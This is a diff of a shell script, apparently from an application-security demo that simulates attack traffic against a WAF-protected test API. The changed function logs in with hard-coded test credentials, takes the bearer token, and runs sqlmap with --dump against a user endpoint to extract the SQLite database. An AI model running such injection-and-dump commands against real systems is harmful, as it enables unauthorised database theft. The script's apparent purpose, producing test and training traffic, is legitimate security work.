@@ -36,29 +36,21 @@ exit 1
 gettoken(){
 TOKEN=$(curl -sS -X POST   ${HOST}/users/v1/login   -H 'accept: application/json' \
 	                  -H 'Content-Type: application/json'  \
-                          -d '{ "password": "pass1", "username": "admin" }' \
+                          -d '{ "password": "pass1", "username": "name1" }' \
 			   | jq -r '.auth_token')		       
 return 0
 } 
 
 sqldump(){
-
-if [ ! -z "$@" ]; then     # Check to see if there is a URL on the command, if so replace
-	         HOST=$@
+if ! [ -x "$(command -v sqlmap)" ]; then
+	        echo "sqlmap is not installed - please install 'apt-get install sqlmap'" >&2
+		        exit 1
 fi
-
-#if ! [ -x "$(command -v sqlmap)" ]; then
-#	        echo "sqlmap is not installed - please install 'apt-get install sqlmap'" >&2
-#		        exit 1
-#fi
-echo "HOST: ${HOST}"
 gettoken
-#sqlmap -u ${HOST}"/users/v1/*name1*" --method=GET --headers="Accept: application/json\nAuthorization: Bearer $TOKEN \nHost: ${TOKEN} " --dbms=sqlite --dump
+echo $HOST $TOKEN
 
-docker run -it --rm --add-host juiceshop.local:$DOCKER_HOST appsec-demo-test-host sqlmap -u $HOST"/users/v1/*name1*" --method=GET --headers="Accept: a
-pplication/json\nAuthorization: Bearer $TOKEN \n
-Host: ${TOKEN} " --dbms=sqlite --dump --batch
-
+docker run -it --rm --add-host juiceshop.local:$DOCKER_HOST appsec-demo-test-host echo $HOST; echo $TOKEN; sqlmap -u $HOST"/users/v1/*name1*" --method=GET --headers="Accept: application/json\nAuthorization: Bearer $TOKEN \n
+Host: ${TOKEN} " --dbms=sqlite --dump
 exit 0
 }
 
@@ -87,7 +79,7 @@ if [ ! -z "$@" ]; then     # Check to see if there is a URL on the command, if s
 fi
 
 echo "HOST: ${HOST}"
-
+echo "TOKEN: ${TOKEN}" 
 echo -e "\n WAF API - Training Traffic - Simulator - $0 -h for options \n"
 for (( i=0; i < $REPEAT ; ++i));
 do
